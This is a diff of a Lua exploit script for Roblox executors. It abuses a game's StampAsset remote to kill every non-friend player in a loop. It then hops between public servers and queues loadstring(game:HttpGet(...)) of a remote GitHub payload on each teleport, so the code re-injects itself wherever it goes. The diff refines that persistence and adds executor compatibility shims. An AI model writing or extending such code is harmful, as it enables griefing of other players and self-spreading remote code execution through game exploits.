@@ -1,41 +1,83 @@
--- ✅ One-time guard
+-- ===== Robust, self-queuing payload =====
+
+-- 0) Match Infinite Yield's timing + compat shims
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local function missing(t, f, fallback)
+    if type(f) == t then return f end
+    return fallback
+end
+
+local queueteleport = missing("function",
+    rawget(getfenv(), "queue_on_teleport")
+    or rawget(getfenv(), "queueteleport")
+    or (syn and syn.queue_on_teleport)
+    or (fluxus and fluxus.queue_on_teleport)
+)
+
+local function qot(str)
+    if queueteleport then
+        local ok, err = pcall(queueteleport, str)
+        if not ok then warn("[QueueOnTeleport failed]:", err) end
+        return ok
+    else
+        warn("[QueueOnTeleport] not available in this executor")
+    end
+end
+
+-- 1) One-time guard (per session)
 if _G.KillSystemActive then
-    warn("🚫 Kill system already active")
+    warn("🚫 Kill system already active in this session")
     return
 end
 _G.KillSystemActive = true
 
---// Services
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
+-- 2) Always queue THIS payload again for the *next* hop (Infinite Yield style persistence)
+local PAYLOAD_URL = "https://raw.githubusercontent.com/NotH4xor/Bahasf/main/Loader/Payload"
+qot(('loadstring(game:HttpGet("%s"))()'):format(PAYLOAD_URL))
 
-local LPlayer = Players.LocalPlayer
-local StampAsset = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("StampAsset")
+-- 3) Services
+local HttpService       = game:GetService("HttpService")
+local TeleportService   = game:GetService("TeleportService")
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace         = game:GetService("Workspace")
+
+local LPlayer   = Players.LocalPlayer
+local Remotes   = ReplicatedStorage:WaitForChild("Remotes")
+local StampAsset= Remotes:WaitForChild("StampAsset")
 local LPlate
 
---// Find local plate
+-- 4) Find local plate (retry softly if assets stream late)
 do
-    local Plates = Workspace:WaitForChild("Plates")
-    for _, plate in ipairs(Plates:GetChildren()) do
-        if plate:FindFirstChild("Owner") and plate.Owner.Value == LPlayer then
-            LPlate = plate:WaitForChild("Plate")
-            break
+    local start = os.clock()
+    while not LPlate and os.clock() - start < 5 do
+        local Plates = Workspace:FindFirstChild("Plates") or Workspace:WaitForChild("Plates", 2)
+        if Plates then
+            for _, plate in ipairs(Plates:GetChildren()) do
+                local owner = plate:FindFirstChild("Owner")
+                local ppart = plate:FindFirstChild("Plate")
+                if owner and ppart and owner.Value == LPlayer then
+                    LPlate = ppart
+                    break
+                end
+            end
         end
+        task.wait(0.25)
     end
 end
 
---// KillModule
+-- 5) KillModule
 local KillModule = {}
 
 local function resolveTarget(target)
-    if target:IsA("Player") then
-        local char = target.Character or target.CharacterAdded:Wait()
-        return char:WaitForChild("HumanoidRootPart", 5)
-    elseif target:IsA("BasePart") then
-        return target
+    if typeof(target) == "Instance" then
+        if target:IsA("Player") then
+            local char = target.Character or target.CharacterAdded:Wait()
+            return char:WaitForChild("HumanoidRootPart", 5)
+        elseif target:IsA("BasePart") then
+            return target
+        end
     end
 end
 
@@ -44,9 +86,7 @@ local function invokeStamp(parts, cframe)
     local ok, res = pcall(function()
         return StampAsset:InvokeServer(41324885, cframe, "{}", parts, 0)
     end)
-    if not ok then
-        warn("[StampAsset Failed]:", res)
-    end
+    if not ok then warn("[StampAsset Failed]:", res) end
     return res
 end
 
@@ -62,7 +102,7 @@ function KillModule.KillMany(targets, cframeOverride)
     local parts = {}
     for _, t in ipairs(targets) do
         local p = resolveTarget(t)
-        if p then table.insert(parts, p) end
+        if p then parts[#parts+1] = p end
     end
     if #parts > 0 and LPlate then
         local dest = cframeOverride or (LPlate.CFrame - Vector3.new(0, 9e9, 0))
@@ -74,9 +114,9 @@ function KillModule.AttachAll(interval)
     interval = interval or 0.1
     task.spawn(function()
         while task.wait(interval) do
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= LPlayer and not LPlayer:IsFriendsWith(player.UserId) then
-                    local part = resolveTarget(player)
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LPlayer and not LPlayer:IsFriendsWith(p.UserId) then
+                    local part = resolveTarget(p)
                     if part and LPlate then
                         invokeStamp({ part }, LPlate.CFrame)
                     end
@@ -86,7 +126,7 @@ function KillModule.AttachAll(interval)
     end)
 end
 
---// Auto monitor respawns
+-- 6) Auto monitor respawns
 local function monitorPlayer(player)
     if player ~= LPlayer and not LPlayer:IsFriendsWith(player.UserId) then
         player.CharacterAdded:Connect(function(character)
@@ -101,20 +141,16 @@ for _, p in ipairs(Players:GetPlayers()) do
     monitorPlayer(p)
 end
 
---// Start enforcement
 KillModule.AttachAll(0.1)
 
--- ✅ Camera crash guard
+-- 7) Camera crash guard
 local function safeCameraFix()
     local cam = Workspace.CurrentCamera
     if cam and typeof(cam.CameraType) == "EnumItem" then
         cam.CameraType = Enum.CameraType.Custom
     end
 end
-task.spawn(function()
-    task.wait(0.1)
-    safeCameraFix()
-end)
+task.defer(function() task.wait(0.1); safeCameraFix() end)
 Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
     task.wait(0.1)
     safeCameraFix()
@@ -122,9 +158,7 @@ end)
 
 print("✅ Kill system started (with camera crash guard)")
 
--- =====================================================
--- 🌍 ServerHop integration w/ queued teleport reinjection
--- =====================================================
+-- 8) ServerHop (+ also queue right before teleport as a belt-and-suspenders)
 local order = "Desc"
 
 local function ServerHop()
@@ -132,27 +166,24 @@ local function ServerHop()
         "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100",
         game.PlaceId, order
     )
-    local Server = nil
 
-    repeat
+    while true do
         local success, result = pcall(game.HttpGet, game, url)
         if success then
             local decoded = HttpService:JSONDecode(result)
             local servers = decoded.data
+            local chosen
             for _, v in ipairs(servers) do
                 if v.maxPlayers > v.playing and v.id ~= game.JobId then
-                    Server = v
+                    chosen = v
                     break
                 end
             end
-            if Server then
-                -- 🔑 Queue reinjection here
-                if queue_on_teleport or queueteleport then
-                    (queue_on_teleport or queueteleport)([[
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/NotH4xor/Bahasf/refs/heads/main/Loader/Payload"))()
-                    ]])
-                end
-                TeleportService:TeleportToPlaceInstance(game.PlaceId, Server.id)
+            if chosen then
+                -- Queue again right before teleport (redundant with step 2, improves reliability)
+                qot(('loadstring(game:HttpGet("%s"))()'):format(PAYLOAD_URL))
+
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, chosen.id)
                 return
             end
             url = string.format(
@@ -161,10 +192,10 @@ local function ServerHop()
             )
         end
         task.wait(2)
-    until false
+    end
 end
 
--- Run hopping watcher in parallel
+-- 9) Hop watcher
 task.spawn(function()
     while task.wait(1) do
         if #Players:GetPlayers() == 2 then
